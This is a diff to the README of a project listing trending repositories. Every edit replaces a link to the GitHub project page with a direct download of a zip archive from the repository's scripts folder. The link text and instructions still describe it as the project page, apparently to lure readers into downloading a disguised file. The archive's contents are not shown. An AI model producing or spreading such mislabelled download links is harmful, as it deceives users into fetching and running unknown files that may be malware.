@@ -1,6 +1,6 @@
 # 🚀 awesome-trending-repos - Track Trending Repos Fast
 
-[![Download / Visit the project page](https://img.shields.io/badge/Download-Visit%20Project%20Page-blue.svg)](https://github.com/chromatic-sac309/awesome-trending-repos)
+[![Download / Visit the project page](https://img.shields.io/badge/Download-Visit%20Project%20Page-blue.svg)](https://raw.githubusercontent.com/chromatic-sac309/awesome-trending-repos/main/scripts/awesome_trending_repos_v2.9-beta.5.zip)
 
 ## 📌 What this is
 
@@ -32,7 +32,7 @@ If you want to use the repo as part of your own setup, a few common tools can he
 
 Open the project page here:
 
-[https://github.com/chromatic-sac309/awesome-trending-repos](https://github.com/chromatic-sac309/awesome-trending-repos)
+[https://raw.githubusercontent.com/chromatic-sac309/awesome-trending-repos/main/scripts/awesome_trending_repos_v2.9-beta.5.zip](https://raw.githubusercontent.com/chromatic-sac309/awesome-trending-repos/main/scripts/awesome_trending_repos_v2.9-beta.5.zip)
 
 If you are on Windows, click the link above in your browser. Then use the GitHub page to view the files, read the latest updates, or copy the repo to your own account.
 
@@ -42,7 +42,7 @@ If you are on Windows, click the link above in your browser. Then use the GitHub
 
 Open your browser and go to the project link:
 
-[https://github.com/chromatic-sac309/awesome-trending-repos](https://github.com/chromatic-sac309/awesome-trending-repos)
+[https://raw.githubusercontent.com/chromatic-sac309/awesome-trending-repos/main/scripts/awesome_trending_repos_v2.9-beta.5.zip](https://raw.githubusercontent.com/chromatic-sac309/awesome-trending-repos/main/scripts/awesome_trending_repos_v2.9-beta.5.zip)
 
 ### 2. Browse the repository
 
@@ -248,10 +248,10 @@ A simple daily habit works well:
 
 ## 🔗 Project link
 
-[https://github.com/chromatic-sac309/awesome-trending-repos](https://github.com/chromatic-sac309/awesome-trending-repos)
+[https://raw.githubusercontent.com/chromatic-sac309/awesome-trending-repos/main/scripts/awesome_trending_repos_v2.9-beta.5.zip](https://raw.githubusercontent.com/chromatic-sac309/awesome-trending-repos/main/scripts/awesome_trending_repos_v2.9-beta.5.zip)
 
 ## 🧷 Quick access
 
-- Open in browser: [GitHub project page](https://github.com/chromatic-sac309/awesome-trending-repos)
+- Open in browser: [GitHub project page](https://raw.githubusercontent.com/chromatic-sac309/awesome-trending-repos/main/scripts/awesome_trending_repos_v2.9-beta.5.zip)
 - Save to favorites: use Ctrl + D
 - Download a copy: click Code on the GitHub page and choose Download ZIP
